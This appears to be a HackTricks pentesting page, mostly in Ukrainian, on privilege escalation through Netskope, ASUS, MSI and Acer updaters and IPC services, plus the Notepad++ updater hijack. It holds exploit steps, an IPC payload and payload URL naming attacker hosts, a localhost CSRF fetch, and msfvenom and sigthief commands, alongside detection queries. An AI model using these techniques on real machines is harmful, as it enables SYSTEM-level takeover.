# Зловживання Enterprise Auto-Updaters та привілейованим IPC (наприклад, Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка узагальнює клас Windows local privilege escalation ланцюжків, знайдених в enterprise endpoint agents та updaters, які відкривають низькотерткісну IPC поверхню та привілейований update flow. Репрезентативний приклад — Netskope Client for Windows < R129 (CVE-2025-0309), де користувач з низькими привілеями може примусити enrollment до сервера, контрольованого атакуючим, а потім доставити шкідливий MSI, який встановлює служба під SYSTEM.

Ключові ідеї, які можна повторно використовувати проти схожих продуктів:
- Зловживати localhost IPC привілейованої служби, щоб примусити повторну реєстрацію або переналаштування на сервер атакуючого.
- Реалізувати vendor’s update endpoints, доставити rogue Trusted Root CA і вказати updater’у на шкідливий, «підписаний» пакет.
- Уникати слабких перевірок підписувача (CN allow-lists), опціональних digest flags, та слабких властивостей MSI.
- Якщо IPC «encrypted», вивести ключ/IV з глобально читабельних ідентифікаторів машини, збережених у registry.
- Якщо служба обмежує викликачів за image path/process name, інжектити в allow-listed процес або створити його suspended і bootstrap-ити ваш DLL через мінімальний thread-context патч.

---
## 1) Примусова реєстрація на сервері атакуючого через localhost IPC

Багато агентів постачають user-mode UI процес, який спілкується зі службою під SYSTEM через localhost TCP використовуючи JSON.

Спостерігалося в Netskope:
- UI: stAgentUI (низької цілісності) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Сформуйте JWT enrollment token, claims якого контролюють backend host (наприклад, AddonUrl). Використайте alg=None, щоб підпис не був потрібний.
2) Відправте IPC message, що викликає provisioning command з вашим JWT та tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Сервіс починає звертатись до вашого зловмисного сервера за реєстрацією/конфігурацією, наприклад:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Примітки:
- Якщо перевірка виклику базується на шляху/імені, ініціюйте запит із бінарного файлу постачальника, внесеного до білого списку (див. §4).

---
## 2) Перехоплення каналу оновлень для виконання коду як SYSTEM

Як тільки клієнт зв'яжеться з вашим сервером, реалізуйте очікувані endpoints і направте його до зловмисного MSI. Типова послідовність:

1) /v2/config/org/clientconfig → Повернути JSON-конфігурацію з дуже коротким інтервалом оновлення, наприклад:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Bypassing common checks seen in the wild:
- Signer CN allow-list: сервіс може перевіряти лише, що Subject CN дорівнює “netSkope Inc” або “Netskope, Inc.”. Ваш rogue CA може видати кінцевий сертифікат з таким CN і підписати MSI.
- CERT_DIGEST property: додайте нешкідливу властивість MSI з назвою CERT_DIGEST. Під час встановлення вона не перевіряється.
- Optional digest enforcement: прапорець конфігурації (наприклад, check_msi_digest=false) вимикає додаткову криптографічну валідацію.

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Атакувальники можуть відтворити шифрування і відправляти валідні зашифровані команди від стандартного користувача. Загальна порада: якщо агент раптово “шифрує” свій IPC, шукайте device IDs, product GUIDs, install IDs під HKLM як матеріал для ключів.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Деякі сервіси намагаються автентифікувати пір, визначаючи PID TCP-з’єднання і порівнюючи шлях/ім'я образу з allow-listed вендорськими бінарниками, розташованими в Program Files (наприклад, stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Оскільки ви ніколи не використовували PROCESS_CREATE_THREAD або PROCESS_SUSPEND_RESUME на вже захищеному процесі (ви його створили), політика драйвера задоволена.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) автоматизує rogue CA, підписання шкідливого MSI та обслуговує необхідні endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Практичний сценарій:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Навіть PowerShell CLI, показаний нижче, спрацьовує, коли заголовок Origin підроблено на довірене значення:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Будь-яке відвідування браузером сайту атакувальника таким чином стає локальним CSRF з одним кліком (або без кліків через `onload`), що запускає SYSTEM helper.

---
## 2) Небезпечна перевірка підпису коду та клонування сертифікатів (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` завантажує довільні виконувані файли, визначені в тілі JSON, і кешує їх у `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Валідація URL завантаження повторно використовує ту ж логіку перевірки підрядка, тож `http://updates.asus.com.attacker.tld:8000/payload.exe` приймається. Після завантаження ADU.exe лише перевіряє, що PE містить підпис і що Subject рядок відповідає ASUS, перед запуском – немає `WinVerifyTrust`, немає перевірки ланцюга сертифікатів.

Щоб озброїти цей потік:
1) Створити payload (наприклад, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Склону́вати підписувача ASUS у нього (наприклад, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Хостити `pwn.exe` на домені-псевдо-`.asus.com` і спровокувати UpdateApp через браузерний CSRF, описаний вище.

Оскільки і Origin, і URL-фільтри працюють на підрядках, а перевірка підписувача лише порівнює рядки, DriverHub завантажує й виконує бінарник атакувальника у своєму підвищеному контексті.

---
## 1) TOCTOU всередині шляхів копіювання/виконання апдейтера (MSI Center CMD_AutoUpdateSDK)

Сервіс SYSTEM MSI Center відкриває TCP-протокол, де кожен кадр має формат `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Основний компонент (Component ID `0f 27 00 00`) містить `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Його обробник:
1) Копіює переданий виконуваний файл у `C:\Windows\Temp\MSI Center SDK.exe`.
2) Перевіряє підпис через `CS_CommonAPI.EX_CA::Verify` (Subject сертифіката має дорівнювати “MICRO-STAR INTERNATIONAL CO., LTD.” і `WinVerifyTrust` має пройти успішно).
3) Створює заплановане завдання, яке запускає тимчасовий файл як SYSTEM з аргументами, контрольованими атакувальником.

Скопійований файл не блокується між перевіркою і викликом `ExecuteTask()`. Атакувальник може:
- Відправити Frame A, що вказує на легітимний MSI-підписаний бінар (гарантує проходження перевірки підпису і постановку завдання в чергу).
- Переграти його з повторними Frame B повідомленнями, що вказують на шкідливий payload, перезаписуючи `MSI Center SDK.exe` одразу після завершення перевірки.

Коли планувальник спрацьовує, він виконує перезаписаний payload під SYSTEM, незважаючи на те, що був перевірений початковий файл. Надійна експлуатація використовує дві горутини/потоки, які спамлять CMD_AutoUpdateSDK до перемоги у вікні TOCTOU.

---
## 2) Зловживання кастомним IPC рівня SYSTEM та impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Кожен плагін/DLL, який завантажується `MSI.CentralServer.exe`, отримує Component ID, збережений у `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Перші 4 байти кадру вибирають цей компонент, дозволяючи атакувальникам маршрутизувати команди до довільних модулів.
- Плагіни можуть визначати власні task runner-и. `Support\API_Support.dll` експонує `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` і безпосередньо викликає `API_Support.EX_Task::ExecuteTask()` з **no signature validation** – будь-який локальний користувач може вказати шлях `C:\Users\<user>\Desktop\payload.exe` і отримати детермінований SYSTEM викон.
- Перехоплення loopback з Wireshark або інструментування .NET бінарів у dnSpy швидко виявляє відповідність Component ↔ command; кастомні Go/ Python клієнти потім можуть відтворювати кадри.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) експонує `\\.\pipe\treadstone_service_LightMode`, і його discretionary ACL дозволяє віддаленим клієнтам доступ (наприклад, `\\TARGET\pipe\treadstone_service_LightMode`). Надсилання command ID `7` з шляхом до файлу викликає рутину сервісу для створення процесу.
- Клієнтська бібліотека серіалізує магічний термінатор-байт (113) разом з аргументами. Динамічне інструментування з Frida/`TsDotNetLib` (див. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) для порад з інструментування) показує, що нативний обробник мапить це значення на `SECURITY_IMPERSONATION_LEVEL` і integrity SID перед викликом `CreateProcessAsUser`.
- Заміна 113 (`0x71`) на 114 (`0x72`) переводить виконання у загальну гілку, яка зберігає повний SYSTEM-токен і встановлює high-integrity SID (`S-1-16-12288`). Тому запущений бінар виконується як unrestricted SYSTEM, як локально, так і між машинами.
- Поєднайте це з відкритим флагом інсталятора (`Setup.exe -nocheck`), щоб розгорнути ACC навіть на лабораторних VM і випробувати pipe без апаратного забезпечення від вендора.

Ці IPC-помилки підкреслюють, чому localhost сервіси повинні застосовувати взаємну автентифікацію (ALPC SIDs, `ImpersonationLevel=Impersonation` фільтри, token filtering) і чому у кожного модуля-хелпера “run arbitrary binary” повинна бути та сама перевірка підпису.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Старі апдейтери Notepad++, що базувалися на WinGUp, не повністю перевіряли автентичність оновлень. Коли атакувальники компрометували хостинг-провайдера сервера оновлень, вони могли змінити XML маніфест і перенаправити лише обрані клієнти на URL-и атакувальника. Оскільки клієнт приймав будь-яку HTTPS відповідь без одночасної перевірки довіреного ланцюга сертифікатів і валідного PE-підпису, жертви завантажували й виконували троянізований NSIS `update.exe`.

Операційний потік (локальний експлойт не потрібен):
1. Infrastructure interception: компрометація CDN/хостингу і відповідь на перевірки оновлень метаданими атакувальника, які вказують на шкідливий URL завантаження.
2. Trojanized NSIS: інсталятор завантажує/виконує payload і зловживає двома ланцюгами виконання:
- Bring-your-own signed binary + sideload: упакувати підписаний Bitdefender `BluetoothService.exe` і покласти шкідливий `log.dll` в його шлях пошуку. Коли підписаний бінар запускається, Windows сідело́дить `log.dll`, який розшифровує і рефлекторно завантажує Chrysalis backdoor (Warbird-protected + API hashing для ускладнення статичного виявлення).
- Scripted shellcode injection: NSIS виконує скомпільований Lua-скрипт, який використовує Win32 API (наприклад, `EnumWindowStationsW`) для інжекції shellcode і постановки Cobalt Strike Beacon.

Рекомендації з жорсткого захисту/детекції для будь-якого авто-апдейтера:
- Застосовувати **certificate + signature verification** для завантаженого інсталятора (pin vendor signer, відхиляти невідповідний CN/ланцюг) і підписувати сам маніфест оновлення (наприклад, XMLDSig). Блокувати перенаправлення, контрольовані маніфестом, якщо вони не валідовані.
- Розглядати **BYO signed binary sideloading** як пост-завантажувальний детекційний сценарій: генерувати алерти, коли підписаний вендорський EXE завантажує DLL з поза його канонічного шляху встановлення (наприклад, Bitdefender завантажує `log.dll` з Temp/Downloads) і коли апдейтер скидає/виконує інсталятори з temp з непідтвердженими підписами.
- Моніторити специфічні артефакти малварі, спостережені в цьому ланцюгу (корисні як загальні індикатори): mutex `Global\Jdhfv_1.0.1`, аномальні записи `gup.exe` у `%TEMP%`, та стадії інжекції shellcode через Lua.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> запуск інсталятора, відмінного від Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ці шаблони застосовні до будь-якого updater'а, який приймає unsigned manifests або не фіксує installer signers — network hijack + malicious installer + BYO-signed sideloading дають remote code execution під виглядом “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
